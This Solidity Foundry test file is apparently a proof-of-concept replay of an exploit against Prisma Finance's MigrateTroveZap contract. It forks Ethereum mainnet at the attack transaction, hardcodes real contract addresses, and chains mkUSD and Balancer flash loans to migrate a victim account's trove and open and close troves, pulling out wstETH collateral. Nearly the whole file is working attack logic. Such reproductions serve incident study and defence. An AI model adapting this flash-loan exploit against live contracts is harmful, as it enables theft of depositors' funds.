// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../../src/interface/interface.sol";

interface IMKUSDLoan {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

contract PrismaExploit is Test {
    IBalancerVault public vault;
    IPriceFeed public priceFeed;

    address public immutable wstETH =
        0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address public immutable mkUSD = 0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28;
    address public immutable MigrateTroveZap =
        0xcC7218100da61441905e0c327749972e3CBee9EE;
    address public immutable BorrowerOperations =
        0x72c590349535AD52e6953744cb2A36B409542719;
    address public immutable TroveManager =
        0x1CC79f3F47BfC060b6F761FcD1afC6D399a968B6;
    address public immutable upperHint =
        0xE87C6f39881D5bF51Cf46d3Dc7E1c1731C2f790A;
    address public immutable lowerHint =
        0x89Ee26FCDFF6B109F81ABC6876600eC427F7907F;

    bytes32 private constant attackTx =
        hex"00c503b595946bccaea3d58025b5f9b3726177bbdc9674e634244135282116c7";

    function setUp() public {
        vm.createSelectFork("eth", attackTx);
        // chainlink price feed and balancer vault
        priceFeed = IPriceFeed(0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac);
        vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    }

    function test_exploit() public {
        uint256 price = priceFeed.fetchPrice(wstETH);
        console2.log("price feed price, ", price);
        deal(mkUSD, address(this), 1_800_000_022_022_732_637);
        console2.log(
            "start feed price, ",
            IERC20(mkUSD).balanceOf(address(this))
        );
        console2.log(
            "start feed price, ",
            IERC20(wstETH).balanceOf(address(this))
        );

        uint256 amount = 1_442_100_643_475_620_087_665_721;

        address account = 0x56A201b872B50bBdEe0021ed4D1bb36359D291ED;
        address troveManagerFrom = address(TroveManager);
        address troveManagerTo = address(TroveManager);
        uint256 maxFeePercentage = 5_000_000_325_833_471;
        uint256 coll = 463_184_447_350_099_685_758;

        bytes memory data = abi.encode(
            account,
            troveManagerFrom,
            troveManagerTo,
            maxFeePercentage,
            coll,
            address(upperHint),
            address(lowerHint)
        );
        //console2.log("--- ~ test_exploit ~ memory:", memory);
        IMKUSDLoan(mkUSD).flashLoan(
            IERC3156FlashBorrower(address(MigrateTroveZap)),
            address(mkUSD),
            amount,
            data
        );

        address[] memory tokens = new address[](1);
        tokens[0] = address(wstETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1_000_000_000_000_000_000;

        uint256[] memory feeAmounts = new uint256[](1);
        feeAmounts[0] = 0;

        vault.flashLoan(address(this), tokens, amounts, abi.encode(""));

        console2.log(
            "after feed price, ",
            IERC20(mkUSD).balanceOf(address(this))
        );
        console2.log(
            "after feed price, ",
            IERC20(wstETH).balanceOf(address(this))
        );
    }

    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) public {
        console2.log("ffff");
        IERC20(wstETH).approve(address(BorrowerOperations), type(uint256).max);
        IBorrowerOperations(BorrowerOperations).setDelegateApproval(
            address(MigrateTroveZap),
            true
        );
        IBorrowerOperations(BorrowerOperations).openTrove(
            address(TroveManager),
            address(this),
            5_000_000_325_833_471,
            1_000_000_000_000_000_000,
            2_000_000_000_000_000_000_000,
            address(upperHint),
            address(lowerHint)
        );

        uint256 amount = 2_000_000_000_000_000_000_000;

        address account = address(this);
        address troveManagerFrom = address(TroveManager);
        address troveManagerTo = address(TroveManager);
        uint256 maxFeePercentage = 5_000_000_325_833_471;
        uint256 coll = 1_282_797_208_306_130_557_587;
        bytes memory data = abi.encode(
            account,
            troveManagerFrom,
            troveManagerTo,
            maxFeePercentage,
            coll,
            address(upperHint),
            address(lowerHint)
        );
        IMKUSDLoan(mkUSD).flashLoan(
            IERC3156FlashBorrower(address(MigrateTroveZap)),
            address(mkUSD),
            amount,
            data
        );

        IBorrowerOperations(BorrowerOperations).closeTrove(
            address(TroveManager),
            address(this)
        );

        uint256 returnAmount = 1_000_000_000_000_000_000;
        // transfer the wstETH loan back to the vault
        IERC20(wstETH).transfer(address(vault), returnAmount);
        console2.log("aa ", IERC20(wstETH).balanceOf(address(this)));
    }
}
